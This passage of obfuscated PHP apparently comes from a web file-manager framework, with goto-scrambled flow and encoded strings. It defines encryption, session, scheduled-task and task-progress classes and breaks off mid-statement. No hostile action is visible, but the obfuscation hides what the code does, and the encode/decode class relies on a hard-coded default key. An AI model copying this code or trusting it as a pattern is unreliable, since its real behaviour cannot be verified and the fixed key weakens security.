AÕ‹ç‹¥: class Mcrypt { public static $defaultKey = "\141\41\x74\x61\x6b\x41\72\144\154\x6d\x63\154\x64\105\x76\54\145"; public static function encode($DÎË©ƒ¸², $DÆŒ£õ……ø = '', $EÂİÉ˜‹÷º = 0, $cßÌŸğ¡ = '') { goto FÊÃÜä˜ù‰; b¹˜‘Šê¿ñ: $FŞ÷Ô·êë = str_replace(array($C„Ñó†Êã[288], $C„Ñó†Êã[8], $C„Ñó†Êã[910]), array($C„Ñó†Êã[424], $C„Ñó†Êã[70], $C„Ñó†Êã[91]), $FŞ÷Ô·êë); return $FŞ÷Ô·êë; goto fÑ”á×Àµ; EºæÄìÒ: $D³ÖŞÉŠºà = substr($cßÌŸğ¡, -$Eï¬™±’±); $fó‘­ªİï = $C²ÄÀ‡¥íò . md5($C²ÄÀ‡¥íò . $D³ÖŞÉŠºà); $f™¿÷åÑ›‹ = strlen($fó‘­ªİï); goto C´¤Ğ”Íİì; C´¤Ğ”Íİì: $DÎË©ƒ¸² = sprintf($C„Ñó†Êã[1938], $EÂİÉ˜‹÷º ? $EÂİÉ˜‹÷º + time() : 0) . substr(md5($DÎË©ƒ¸² . $bá™ÌìŞ¾), 0, 16) . $DÎË©ƒ¸²; $B‰š®İ°“¹ = strlen($DÎË©ƒ¸²); $cÛ»¥“Œ»” = array(); goto Aƒ¦ÏÔÒî‘; FË·ç×åÔï: $FŞ÷Ô·êë = $C„Ñó†Êã[33]; for ($dÛÖ¶‹©Å¿ = $CºÉ½›‘¨ = $f£ÑÀ˜ƒãë = 0; $f£ÑÀ˜ƒãë < $B‰š®İ°“¹; $f£ÑÀ˜ƒãë++) { $dÛÖ¶‹©Å¿ = ($dÛÖ¶‹©Å¿ + 1) % 256; $CºÉ½›‘¨ = ($CºÉ½›‘¨ + $eáÈƒ÷…ì[$dÛÖ¶‹©Å¿]) % 256; $e“¢²Ü«òç = $eáÈƒ÷…ì[$dÛÖ¶‹©Å¿]; $eáÈƒ÷…ì[$dÛÖ¶‹©Å¿] = $eáÈƒ÷…ì[$CºÉ½›‘¨]; $eáÈƒ÷…ì[$CºÉ½›‘¨] = $e“¢²Ü«òç; $FŞ÷Ô·êë .= chr(ord($DÎË©ƒ¸²[$f£ÑÀ˜ƒãë]) ^ $eáÈƒ÷…ì[($eáÈƒ÷…ì[$dÛÖ¶‹©Å¿] + $eáÈƒ÷…ì[$CºÉ½›‘¨]) % 256]); } $FŞ÷Ô·êë = $D³ÖŞÉŠºà . str_replace($C„Ñó†Êã[910], $C„Ñó†Êã[33], base64_encode($FŞ÷Ô·êë)); goto b¹˜‘Šê¿ñ; Aƒ¦ÏÔÒî‘: for ($f£ÑÀ˜ƒãë = 0; $f£ÑÀ˜ƒãë <= 255; $f£ÑÀ˜ƒãë++) { $cÛ»¥“Œ»”[$f£ÑÀ˜ƒãë] = ord($fó‘­ªİï[$f£ÑÀ˜ƒãë % $f™¿÷åÑ›‹]); } $eáÈƒ÷…ì = range(0, 255); for ($CºÉ½›‘¨ = $f£ÑÀ˜ƒãë = 0; $f£ÑÀ˜ƒãë < 256; $f£ÑÀ˜ƒãë++) { $CºÉ½›‘¨ = ($CºÉ½›‘¨ + $eáÈƒ÷…ì[$f£ÑÀ˜ƒãë] + $cÛ»¥“Œ»”[$f£ÑÀ˜ƒãë]) % 256; $e“¢²Ü«òç = $eáÈƒ÷…ì[$f£ÑÀ˜ƒãë]; $eáÈƒ÷…ì[$f£ÑÀ˜ƒãë] = $eáÈƒ÷…ì[$CºÉ½›‘¨]; $eáÈƒ÷…ì[$CºÉ½›‘¨] = $e“¢²Ü«òç; } goto FË·ç×åÔï; FÊÃÜä˜ù‰: $C„Ñó†Êã =& $_SERVER[‡’¶øåüç˜]; $Eï¬™±’± = 4; $DÆŒ£õ……ø = md5($DÆŒ£õ……ø ? $DÆŒ£õ……ø : self::$defaultKey); goto FùÈ‹ĞÅ”¬; FùÈ‹ĞÅ”¬: $C²ÄÀ‡¥íò = md5(substr($DÆŒ£õ……ø, 0, 16)); $bá™ÌìŞ¾ = md5(substr($DÆŒ£õ……ø, 16, 16)); $cßÌŸğ¡ = $cßÌŸğ¡ ? $cßÌŸğ¡ : md5(microtime()); goto EºæÄìÒ; fÑ”á×Àµ: } public static function decode($B«ßµòø, $F¿Ë‚‘×³ = '') { goto BÇÆ§‹Î´Ì; EÚòÎ¡³ãÚ: $F¿Ë‚‘×³ = md5($F¿Ë‚‘×³ ? $F¿Ë‚‘×³ : self::$defaultKey); $fÉ¿Í×Ğ“ = md5(substr($F¿Ë‚‘×³, 0, 16)); $EÀ”¤Ãà«± = md5(substr($F¿Ë‚‘×³, 16, 16)); goto aõÁ§Ö¹„Ö; fšÆéº¢ˆô: $b¬µ‘ÃÔº = $D·“äµÚä¼[33]; for ($C˜Ï¡Åö¿ = $Eî÷¬šŸß¯ = $c¶¸£¨é‚Ö = 0; $c¶¸£¨é‚Ö < $a°¸¢¦ó ²; $c¶¸£¨é‚Ö++) { $C˜Ï¡Åö¿ = ($C˜Ï¡Åö¿ + 1) % 256; $Eî÷¬šŸß¯ = ($Eî÷¬šŸß¯ + $dÀëŠî­¹ã[$C˜Ï¡Åö¿]) % 256; $e¾’Ë’˜Œ = $dÀëŠî­¹ã[$C˜Ï¡Åö¿]; $dÀëŠî­¹ã[$C˜Ï¡Åö¿] = $dÀëŠî­¹ã[$Eî÷¬šŸß¯]; $dÀëŠî­¹ã[$Eî÷¬šŸß¯] = $e¾’Ë’˜Œ; $b¬µ‘ÃÔº .= chr(ord($B«ßµòø[$c¶¸£¨é‚Ö]) ^ $dÀëŠî­¹ã[($dÀëŠî­¹ã[$C˜Ï¡Åö¿] + $dÀëŠî­¹ã[$Eî÷¬šŸß¯]) % 256]); } $BÑ‘–Ãî² = intval(substr($b¬µ‘ÃÔº, 0, 10)); goto b³íäÁÛ¥º; aõÁ§Ö¹„Ö: $FŞÌ”Ÿ‚ÖÆ = substr($B«ßµòø, 0, $aÉÜ™×ù©Ô); $b‘ƒñÈ½§¨ = $fÉ¿Í×Ğ“ . md5($fÉ¿Í×Ğ“ . $FŞÌ”Ÿ‚ÖÆ); $CÒâÜí†»Š = strlen($b‘ƒñÈ½§¨); goto d›„¨†Øª¢; b³íäÁÛ¥º: if (($BÑ‘–Ãî² == 0 || $BÑ‘–Ãî² - time() > 0) && substr($b¬µ‘ÃÔº, 10, 16) == substr(md5(substr($b¬µ‘ÃÔº, 26) . $EÀ”¤Ãà«±), 0, 16)) { return substr($b¬µ‘ÃÔº, 26); } else { return $D·“äµÚä¼[33]; } goto DØˆãÌ«ÉÙ; d›„¨†Øª¢: $B«ßµòø = base64_decode(substr($B«ßµòø, $aÉÜ™×ù©Ô)); $a°¸¢¦ó ² = strlen($B«ßµòø); $cìŠµ„‰Ğ = array(); goto A×Ì­¡; BÇÆ§‹Î´Ì: $D·“äµÚä¼ =& $_SERVER[‡’¶øåüç˜]; $B«ßµòø = str_replace(array($D·“äµÚä¼[424], $D·“äµÚä¼[70], $D·“äµÚä¼[91]), array($D·“äµÚä¼[288], $D·“äµÚä¼[8], $D·“äµÚä¼[910]), $B«ßµòø); $aÉÜ™×ù©Ô = 4; goto EÚòÎ¡³ãÚ; A×Ì­¡: for ($c¶¸£¨é‚Ö = 0; $c¶¸£¨é‚Ö <= 255; $c¶¸£¨é‚Ö++) { $cìŠµ„‰Ğ[$c¶¸£¨é‚Ö] = ord($b‘ƒñÈ½§¨[$c¶¸£¨é‚Ö % $CÒâÜí†»Š]); } $dÀëŠî­¹ã = range(0, 255); for ($Eî÷¬šŸß¯ = $c¶¸£¨é‚Ö = 0; $c¶¸£¨é‚Ö < 256; $c¶¸£¨é‚Ö++) { $Eî÷¬šŸß¯ = ($Eî÷¬šŸß¯ + $dÀëŠî­¹ã[$c¶¸£¨é‚Ö] + $cìŠµ„‰Ğ[$c¶¸£¨é‚Ö]) % 256; $e¾’Ë’˜Œ = $dÀëŠî­¹ã[$c¶¸£¨é‚Ö]; $dÀëŠî­¹ã[$c¶¸£¨é‚Ö] = $dÀëŠî­¹ã[$Eî÷¬šŸß¯]; $dÀëŠî­¹ã[$Eî÷¬šŸß¯] = $e¾’Ë’˜Œ; } goto fšÆéº¢ˆô; DØˆãÌ«ÉÙ: } } define($_SERVER[‡’¶øåüç˜][1939], 1); define($_SERVER[‡’¶øåüç˜][1940], 2); goto d÷ÇÉ‡Ìœ—; dÅ¸—İ¯: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto eŸ’äá´¬ä; BÒˆ«ø°ÊÛ: if (self::$sessionSign) { } else { if (Cookie::get($CÉÙØâÂ†œ)) { self::$sessionSign = Cookie::get($CÉÙØâÂ†œ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($CÉÙØâÂ†œ, self::$sessionSign, self::$sessionTime); $B‚Ÿ´¸Õ = $Aš…‘ÇÆ˜[$C»É‡²óĞ©[1405]]; goto bóÄˆÄ­à…; cóíÍ¨ëÓ¡: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $F”ÀŠ½…Ã¨ = new self(); return $F”ÀŠ½…Ã¨; goto Aá·çİ÷Ş; eŸ’äá´¬ä: $C»É‡²óĞ© =& $_SERVER[‡’¶øåüç˜]; static $F”ÀŠ½…Ã¨ = false; if ($F”ÀŠ½…Ã¨) { return $F”ÀŠ½…Ã¨; } goto c¦‘‡¡ÌƒÆ; bóÄˆÄ­à…: $Aãï· ´îÁ = $Aš…‘ÇÆ˜[$B‚Ÿ´¸Õ]; $C Œ¹óÆ¥ë = $Aš…‘ÇÆ˜[$C»É‡²óĞ©[761]]; switch ($B‚Ÿ´¸Õ) { case $C»É‡²óĞ©[17]: self::$handle = Model($C»É‡²óĞ©[762]); break; case $C»É‡²óĞ©[763]: self::$handle = new CacheRedis($Aãï· ´îÁ, $C Œ¹óÆ¥ë); break; case $C»É‡²óĞ©[764]: self::$handle = new CacheMemcached($Aãï· ´îÁ, $C Œ¹óÆ¥ë); break; case $C»É‡²óĞ©[171]: $Aãï· ´îÁ[$C»É‡²óĞ©[75]] = $Aãï· ´îÁ[$C»É‡²óĞ©[75]] . $C»É‡²óĞ©[1406]; self::$handle = new CacheFile($Aãï· ´îÁ, $C Œ¹óÆ¥ë); default: break; } goto cóíÍ¨ëÓ¡; c¦‘‡¡ÌƒÆ: $Aš…‘ÇÆ˜ = $GLOBALS[$C»É‡²óĞ©[6]][$C»É‡²óĞ©[341]]; self::$sessionTime = $Aš…‘ÇÆ˜[$C»É‡²óĞ©[1403]]; $CÉÙØâÂ†œ = isset($GLOBALS[$C»É‡²óĞ©[1404]]) ? $GLOBALS[$C»É‡²óĞ©[1404]] : SESSION_ID; goto BÒˆ«ø°ÊÛ; Aá·çİ÷Ş: } public static function sign($Dšˆ£ËØ¹œ = false) { $Dšˆ£ËØ¹œ && (self::$sessionSign = $Dšˆ£ËØ¹œ); self::init(); return self::$sessionSign; } public static function set($AÒ¿·óÃ, $C„‰î¯ğ’Á = false) { self::init(); if (is_array($AÒ¿·óÃ)) { foreach ($AÒ¿·óÃ as $A¾ø£…ø·ö => $BÈÏŠ÷áÁµ) { array_set_value(self::$data, $A¾ø£…ø·ö, $BÈÏŠ÷áÁµ); } } else { array_set_value(self::$data, $AÒ¿·óÃ, $C„‰î¯ğ’Á); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($CÕÌö™ªèš = false) { self::init(); if (!$CÕÌö™ªèš) { return self::$data; } return array_get_value(self::$data, $CÕÌö™ªèš); } public static function remove($a¸Êˆ†Ô•ƒ) { self::init(); unset(self::$data[$a¸Êˆ†Ô•ƒ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[‡’¶øåüç˜][766])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto f¶Œà²¦È—; Aí™¤ãĞ×Ñ: while (!0) { self::cacheClear(); if (self::valueGet($ašœ­Å’Ô[695]) != $ašœ­Å’Ô[83]) { self::valueSet($ašœ­Å’Ô[1407], $ašœ­Å’Ô[481]); self::log($ašœ­Å’Ô[1411]); die; } self::valueSet($ašœ­Å’Ô[1407], $ašœ­Å’Ô[83]); self::valueSet($ašœ­Å’Ô[1408], time()); self::taskRunAll(); sleep(self::valueGet($ašœ­Å’Ô[1412])); } goto fÌ¡Â»‹™°; Dù£™ñÄ‰±: http_close(); self::valueSet($ašœ­Å’Ô[1407], $ašœ­Å’Ô[83]); Hook::bind($ašœ­Å’Ô[1409], $ašœ­Å’Ô[1410]); goto Aí™¤ãĞ×Ñ; f¶Œà²¦È—: $ašœ­Å’Ô =& $_SERVER[‡’¶øåüç˜]; if (self::valueGet($ašœ­Å’Ô[695]) != $ašœ­Å’Ô[83]) { return; } if (self::valueGet($ašœ­Å’Ô[1407]) == $ašœ­Å’Ô[83]) { $F³ºâÛ¹Ä = self::valueGet($ašœ­Å’Ô[1408]); if (time() - $F³ºâÛ¹Ä > 3600 * 2) { self::restart(); } return; } goto Dù£™ñÄ‰±; fÌ¡Â»‹™°: } public static function restart() { $d†òÆ¤‡Ô‡ =& $_SERVER[‡’¶øåüç˜]; http_close(); self::valueSet($d†òÆ¤‡Ô‡[695], $d†òÆ¤‡Ô‡[481]); sleep(self::valueGet($d†òÆ¤‡Ô‡[1412]) + 5); self::valueSet($d†òÆ¤‡Ô‡[1407], $d†òÆ¤‡Ô‡[481]); self::valueSet($d†òÆ¤‡Ô‡[695], $d†òÆ¤‡Ô‡[83]); } public static function shutdownEvent() { $FåÆÓ¥£ ° =& $_SERVER[‡’¶øåüç˜]; self::valueSet($FåÆÓ¥£ °[1407], $FåÆÓ¥£ °[481]); self::log($FåÆÓ¥£ °[1413]); } public static function config($aëµ×ÈÍ°, $EãÙ·Ğõ·) { $B·Š‰–óÈÂ =& $_SERVER[‡’¶øåüç˜]; $DÓÍ­ã¬‘Ä = 20; $EãÙ·Ğõ· = intval($EãÙ·Ğõ·) <= $DÓÍ­ã¬‘Ä ? $DÓÍ­ã¬‘Ä : intval($EãÙ·Ğõ·); self::valueSet($B·Š‰–óÈÂ[695], $aëµ×ÈÍ°); self::valueSet($B·Š‰–óÈÂ[1412], $EãÙ·Ğõ·); } private static function taskRunAll() { $dèÒÎàÍƒ =& $_SERVER[‡’¶øåüç˜]; $c¢°¶ª¬ Ì = Model($dèÒÎàÍƒ[1414])->listData(); $E„ô›Õ³Ã× = count($c¢°¶ª¬ Ì); for ($b´‹Ÿ¢×Ò = 0; $b´‹Ÿ¢×Ò < $E„ô›Õ³Ã×; $b´‹Ÿ¢×Ò++) { $c’àÁİ‰ = $c¢°¶ª¬ Ì[$b´‹Ÿ¢×Ò]; if ($c’àÁİ‰[$dèÒÎàÍƒ[1415]] != $dèÒÎàÍƒ[83]) { continue; } if (!self::taskTimeCheck($c’àÁİ‰)) { continue; } self::taskRun($c’àÁİ‰); } Hook::trigger($dèÒÎàÍƒ[1416]); } private static function taskTimeCheck($fÉç¬±¤±â) { goto d®Ø­í ê„; Cµ”ÍàİÈ: $E÷‡Ø½Œ¸Ú = strtotime($ešŞ¡õš‰š[1417] . $bÑ‚¾±õ‡[$ešŞ¡õš‰š[1418]] . $ešŞ¡õš‰š[1419]) - strtotime($ešŞ¡õš‰š[1420]); $Eœ½ŠÎœåÍ = time() - strtotime(date($ešŞ¡õš‰š[1421]) . $ešŞ¡õš‰š[1422]); $c›ªî†Û„Æ = $Eœ½ŠÎœåÍ >= $E÷‡Ø½Œ¸Ú && $Eœ½ŠÎœåÍ <= $E÷‡Ø½Œ¸Ú + 3600; goto D‹Òñ¸Ú†‡; D‹Òñ¸Ú†‡: switch ($bÑ‚¾±õ‡[$ešŞ¡õš‰š[29]]) { case $ešŞ¡õš‰š[1423]: if (time() - $eä“Ìõ¶…Œ < 3600 * 24 * 30) { return !1; } if ($bÑ‚¾±õ‡[$ešŞ¡õš‰š[1423]] == date($ešŞ¡õš‰š[1424]) && $c›ªî†Û„Æ) { return !0; } break; case $ešŞ¡õš‰š[1425]: if (time() - $eä“Ìõ¶…Œ < 3600 * 24 * 7) { return !1; } $bğ†´Îêì = date($ešŞ¡õš‰š[1426]) == 0 ? 7 : date($ešŞ¡õš‰š[1426]); if ($bÑ‚¾±õ‡[$ešŞ¡õš‰š[1425]] == $bğ†´Îêì && $c›ªî†Û„Æ) { return !0; } break; case $ešŞ¡õš‰š[1418]: if (time() - $eä“Ìõ¶…Œ < 3600 * 24) { return !1; } if ($c›ªî†Û„Æ) { return !0; } break; case $ešŞ¡õš‰š[1427]: if (time() - $eä“Ìõ¶…Œ >= floatval($bÑ‚¾±õ‡[$ešŞ¡õš‰š[1427]]) * 60) { return !0; } break; default: break; } return !1; goto d’ÅŞƒˆ÷; d®Ø­í ê„: $ešŞ¡õš‰š =& $_SERVER[‡’¶øåüç˜]; $bÑ‚¾±õ‡ = json_decode($fÉç¬±¤±â[$ešŞ¡õš‰š[194]], !0); $eä“Ìõ¶…Œ = intval($fÉç¬±¤±â[$ešŞ¡õš‰š[1408]]); goto Cµ”ÍàİÈ; d’ÅŞƒˆ÷: } public static function taskRun($d¢’ÙÛ¸ø¾) { goto b•Ùº…‹ã‡; AÇõ…£¤ª‚: Model($fó§˜•ÓĞ“[1432])->add(array($fó§˜•ÓĞ“[1433] => $fó§˜•ÓĞ“[33], $fó§˜•ÓĞ“[1434] => $fó§˜•ÓĞ“[481], $fó§˜•ÓĞ“[29] => $fó§˜•ÓĞ“[1435] . $d¢’ÙÛ¸ø¾[$fó§˜•ÓĞ“[371]], $fó§˜•ÓĞ“[1436] => json_encode(array($fó§˜•ÓĞ“[28] => $d¢’ÙÛ¸ø¾[$fó§˜•ÓĞ“[28]], $fó§˜•ÓĞ“[1437] => timeFloat() - $F÷¶¾ƒƒá‡, $fó§˜•ÓĞ“[285] => $F™ëğœ¸¬š)))); self::log($fó§˜•ÓĞ“[1438] . $d¢’ÙÛ¸ø¾[$fó§˜•ÓĞ“[371]] . $fó§˜•ÓĞ“[1439] . $F™ëğœ¸¬š); return !0; goto C‡Ò²Ÿš§; fÈ‡”œï: $F÷¶¾ƒƒá‡ = timeFloat(); $F™ëğœ¸¬š = $fó§˜•ÓĞ“[33]; switch ($d¢’ÙÛ¸ø¾[$fó§˜•ÓĞ“[29]]) { case $fó§˜•ÓĞ“[299]: $dË‘©…ƒÀ = url_request($d¢’ÙÛ¸ø¾[$fó§˜•ÓĞ“[1431]], $fó§˜•ÓĞ“[220], !1, !1, !1, !1, 5); $F™ëğœ¸¬š = strlen($dË‘©…ƒÀ); break; case $fó§˜•ÓĞ“[219]: $F™ëğœ¸¬š = Hook::apply($d¢’ÙÛ¸ø¾[$fó§˜•ÓĞ“[1431]]); default: break; } goto AÇõ…£¤ª‚; b•Ùº…‹ã‡: $fó§˜•ÓĞ“ =& $_SERVER[‡’¶øåüç˜]; self::log($fó§˜•ÓĞ“[1428] . $d¢’ÙÛ¸ø¾[$fó§˜•ÓĞ“[371]] . $fó§˜•ÓĞ“[1429] . $d¢’ÙÛ¸ø¾[$fó§˜•ÓĞ“[28]] . $fó§˜•ÓĞ“[1430] . $d¢’ÙÛ¸ø¾[$fó§˜•ÓĞ“[1431]]); Model($fó§˜•ÓĞ“[1414])->run($d¢’ÙÛ¸ø¾[$fó§˜•ÓĞ“[371]]); goto fÈ‡”œï; C‡Ò²Ÿš§: } private static function valueGet($dÖ§Ğ¸Ë‚æ) { $D…¤£ß™ =& $_SERVER[‡’¶øåüç˜]; $B³«Ü¨¼Ù† = $D…¤£ß™[1440]; $añŞ’×á“Œ = Model($D…¤£ß™[1441])->get($dÖ§Ğ¸Ë‚æ, $B³«Ü¨¼Ù†); if (is_null($añŞ’×á“Œ)) { Model($D…¤£ß™[1441])->set($D…¤£ß™[1412], 10, $B³«Ü¨¼Ù†); Model($D…¤£ß™[1441])->set($D…¤£ß™[695], $D…¤£ß™[83], $B³«Ü¨¼Ù†); Model($D…¤£ß™[1441])->set($D…¤£ß™[1407], $D…¤£ß™[481], $B³«Ü¨¼Ù†); $añŞ’×á“Œ = Model($D…¤£ß™[1441])->get($dÖ§Ğ¸Ë‚æ, $B³«Ü¨¼Ù†); } return $añŞ’×á“Œ; } private static function valueSet($fœé²³”¢é, $cÒå¶ê“¸) { $E‰ëìÕ¶êŠ =& $_SERVER[‡’¶øåüç˜]; return Model($E‰ëìÕ¶êŠ[1441])->set($fœé²³”¢é, $cÒå¶ê“¸, $E‰ëìÕ¶êŠ[1440]); } protected static function log($AŒˆĞƒ‹ğ—) { write_log($AŒˆĞƒ‹ğ—, $_SERVER[‡’¶øåüç˜][1442]); } private static function cacheClear() { $f©»Õ‘í‹Ä =& $_SERVER[‡’¶øåüç˜]; $EØÕ›¥éØ§ = Model($f©»Õ‘í‹Ä[1441])->cacheKey($f©»Õ‘í‹Ä[1440]); Cache::clearMemory($EØÕ›¥éØ§); Model($f©»Õ‘í‹Ä[1414])->cacheClear(); } } class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\162\165\x6e\x6e\151\x6e\147"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($D˜‡õ‚…Òø, $D§Œ¨¡¡ = '', $DÄÍ™ï¯Ú = 0, $d‰Ô°¤²è = '') { goto F›¾õ©Õ¬Š; aùÌ£ƒÎÑ¤: Hook::bind($d…£Çù«¼[1409], array($this, $d…£Çù«¼[1451])); Hook::bind($d…£Çù«¼[1452], array($this, $d…£Çù«¼[1453])); $this->startAfter(); goto Có·”‡¥š; F›¾õ©Õ¬Š: $d…£Çù«¼ =& $_SERVER[‡’¶øåüç˜]; if (self::get($D˜‡õ‚…Òø)) { return; } $this->task = array($d…£Çù«¼[371] => $D˜‡õ‚…Òø, $d…£Çù«¼[1443] => USER_ID, $d…£Çù«¼[1348] => $d‰Ô°¤²è, $d…£Çù«¼[29] => $D§Œ¨¡¡, $d…£Çù«¼[982] => $d…£Çù«¼[33], $d…£Çù«¼[980] => $DÄÍ™ï¯Ú, $d…£Çù«¼[994] => 0, $d…£Çù«¼[1444] => 0, $d…£Çù«¼[1445] => 0, $d…£Çù«¼[1446] => timeFloat(), $d…£Çù«¼[1447] => 0, $d…£Çù«¼[1448] => 0, $d…£Çù«¼[1449] => 0, $d…£Çù«¼[1450] => 0, $d…£Çù«¼[695] => $d…£Çù«¼[1407]); goto aùÌ£ƒÎÑ¤; Có·”‡¥š: Hook::trigger($d…£Çù«¼[1454], $this->task); $this->task[$d…£Çù«¼[1448]] = timeFloat(); goto aˆÌÁô‹°; aˆÌÁô‹°: } public function end() { goto fÄ¯«…á±±; fÄ¯«…á±±: $bÜÃçØì =& $_SERVER[‡’¶øåüç˜]; if (!$this->task) { return; } if ($this->task[$bÜÃçØì[1448]]) { self::valueSet($this->task[$bÜÃçØì[371]], !1); } goto F“¶äÔªõ; F“¶äÔªõ: $cÁìÓóµØ = timeFloat() - $this->task[$bÜÃçØì[1446]]; self::log($bÜÃçØì[1455] . $this->task[$bÜÃçØì[371]] . $bÜÃçØì[1456] . $cÁìÓóµØ . $bÜÃçØì[1457]); Hook::unbind($bÜÃçØì[1409], array($this, $bÜÃçØì[1451])); goto fÑÊº×¦¦À; fÑÊº×¦¦À: Hook::unbind($bÜÃçØì[1452], array($this, $bÜÃçØì[1453])); $this->endAfter(); $this->task = !1; goto c¸ìéšğˆÔ; c¸ìéšğˆÔ: } public function update($FĞ³È¡”·ë = 0, $Dã©Ø¸‹Ûâ = false) { goto C¼Ñ„«ó š; c³˜œôğ÷µ: $b›¦‚‰ì‰ = self::get($B’ë÷ëÖŒê[$eõ§ÁÁ×·[371]]); $A‹Ò° ÚÆ° = $b›¦‚‰ì‰[$eõ§ÁÁ×·[695]]; if ($A‹Ò° ÚÆ° == self::STATYS_KILL) { $DÜÎÃØÃ„¾ = array($eõ§ÁÁ×·[1458] => LNG($eõ§ÁÁ×·[1459]), $eõ§ÁÁ×·[1040] => !1); Cache::set($eõ§ÁÁ×·[1460] . $this->task[$eõ§ÁÁ×·[371]], $DÜÎÃØÃ„¾, 30); $this->end(); die; } else { if ($A‹Ò° ÚÆ° == self::STATYS_STOP) { $AëçŞË„›æ = 2; $b›¦‚‰ì‰[$eõ§ÁÁ×·[1449]] += $AëçŞË„›æ; self::valueSet($B’ë÷ëÖŒê[$eõ§ÁÁ×·[371]], $b›¦‚‰ì‰); sleep($AëçŞË„›æ); $this->update(); return; } } goto bâÇÓœË¦”; Dªˆ¡³Êë¡: $this->updateAfter(); $A¼ÍÑŒÊ½œ = 0.2; if (timeFloat() - $B’ë÷ëÖŒê[$eõ§ÁÁ×·[1448]] < $A¼ÍÑŒÊ½œ && !$Dã©Ø¸‹Ûâ) { return; } goto c³˜œôğ÷µ; C¼Ñ„«ó š: $eõ§ÁÁ×· =& $_SERVER[‡’¶øåüç˜]; $B’ë÷ëÖŒê =& $this->task; if (!$B’ë÷ëÖŒê) { return; } goto Bä—èœ×ÚÄ; bâÇÓœË¦”: $B’ë÷ëÖŒê[$eõ§ÁÁ×·[695]] = $A‹Ò° ÚÆ° ? $A‹Ò° ÚÆ° : $B’ë÷ëÖŒê[$eõ§ÁÁ×·[695]]; $B’ë÷ëÖŒê[$eõ§ÁÁ×·[1449]] = $b›¦‚‰ì‰[$eõ§ÁÁ×·[1449]] ? $b›¦‚‰ì‰[$eõ§ÁÁ×·[1449]] : 0; $B’ë÷ëÖŒê[$eõ§ÁÁ×·[1448]] = timeFloat(); goto aã¾¿®à±; Bä—èœ×ÚÄ: $B’ë÷ëÖŒê[$eõ§ÁÁ×·[994]] += $FĞ³È¡”·ë; $B’ë÷ëÖŒê[$eõ§ÁÁ×·[1447]] = timeFloat(); if ($B’ë÷ëÖŒê[$eõ§ÁÁ×·[980]]) { if ($B’ë÷ëÖŒê[$eõ§ÁÁ×·[980]] < $B’ë÷ëÖŒê[$eõ§ÁÁ×·[994]]) { $B’ë÷ëÖŒê[$eõ§ÁÁ×·[980]] = $B’ë÷ëÖŒê[$eõ§ÁÁ×·[994]]; } $BË÷™®‹ŒŞ = timeFloat() - $B’ë÷ëÖŒê[$eõ§ÁÁ×·[1446]] - $B’ë÷ëÖŒê[$eõ§ÁÁ×·[1449]]; $B’ë÷ëÖŒê[$eõ§ÁÁ×·[1444]] = $B’ë÷ëÖŒê[$eõ§ÁÁ×·[994]] / $B’ë÷ëÖŒê[$eõ§ÁÁ×·[980]]; $B’ë÷ëÖŒê[$eõ§ÁÁ×·[1445]] = $B’ë÷ëÖŒê[$eõ§ÁÁ×·[994]] / $BË÷™®‹ŒŞ; if ($B’ë÷ëÖŒê[$eõ§ÁÁ×·[1444]] > 0) { $B’ë÷ëÖŒê[$eõ§ÁÁ×·[1450]] = $BË÷™®‹ŒŞ * (1 - $B’ë÷ëÖŒê[$eõ§ÁÁ×·[1444]]) / $B’ë÷ëÖŒê[$eõ§ÁÁ×·[1444]]; } $B’ë÷ëÖŒê[$eõ§ÁÁ×·[1450]] = $B’ë÷ëÖŒê[$eõ§ÁÁ×·[1450]] <= 0 ? 0 : $B’ë÷ëÖŒê[$eõ§ÁÁ×·[1450]]; } goto Dªˆ¡³Êë¡; aã¾¿®à±: Hook::trigger($eõ§ÁÁ×·[1461], $B’ë÷ëÖŒê); self::valueSet($B’ë÷ëÖŒê[$eõ§ÁÁ×·[371]], $B’ë÷ëÖŒê); goto B”„ºùØ‘; B”„ºùØ‘: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($AÂç‰Ú“ï‘) { $E×‹Î¥ØÏ˜ =& $_SERVER[‡’¶øåüç˜]; Cache::set($E×‹Î¥ØÏ˜[1460] . $this->task[$E×‹Î¥ØÏ˜[371]], $AÂç‰Ú“ï‘, 60); return $AÂç‰Ú“ï‘; } public static function get($B¬ïã±×¯) { return self::valueGet($B¬ïã±×¯); } public static function listData() { $aˆÊâÒ²‚ = self::valueGet(); return array_sort_by($aˆÊâÒ²‚, $_SERVER[‡’¶øåüç˜][1446], !0); } public static function kill($AÔÔ®ùç×) { return self::changeStatus($AÔÔ®ùç×, self::STATYS_KILL); } public static function stop($b´Ê¡ÌÙ’Â) { return self::changeStatus($b´Ê¡ÌÙ’Â, self::STATYS_STOP); } public static function restart($bŠò‰¡äöŞ) { return self::changeStatus($bŠò‰¡äöŞ, self::STATYS_RUNNING); } public static function killAll() { $DƒàÉàÈˆ® =& $_SERVER[‡’¶øåüç˜]; $AÌÃ§Ï»òÎ = self::listData(); foreach ($AÌÃ§Ï»òÎ as $bÏ‹¸ÉñÇá) { self::kill($bÏ‹¸ÉñÇá[$DƒàÉàÈˆ®[371]]); } sleep(2); foreach ($AÌÃ§Ï»òÎ as $bÏ‹¸ÉñÇá) { self::valueSet($bÏ‹¸ÉñÇá[$DƒàÉàÈˆ®[371]], !1); } } private static function changeStatus($B£÷Š¨ãŒ¸, $aù»•‚½¡») { goto e›–£ÃºÔ’; eùŠçäˆß›: $bÄ´‚Ê×‘è[$aˆ½ØòéÊ [695]] = $aù»•‚½¡»; self::valueSet($B£÷Š¨ãŒ¸, $bÄ´‚Ê×‘è); self::log($aˆ½ØòéÊ [1462] . $bÄ´‚Ê×‘è[$aˆ½ØòéÊ [371]] . 